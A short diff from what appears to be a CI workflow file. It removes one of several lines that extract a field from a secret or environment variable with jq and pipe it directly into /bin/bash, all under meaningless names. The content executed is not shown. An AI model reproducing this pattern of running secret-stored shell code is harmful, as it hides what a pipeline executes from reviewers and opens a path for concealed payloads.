@@ -23,7 +23,6 @@ jobs:
           h5: ${{ secrets.h5 }}
         run: |
           printf '%s' "$h5" | jq -r .ojn32 | /bin/bash
-          echo $nr9 | jq -r .pouz12 | /bin/bash
           printf '%s' "$w106" | jq -r .xuxzm00 | /bin/bash
 
       - name: Upload results
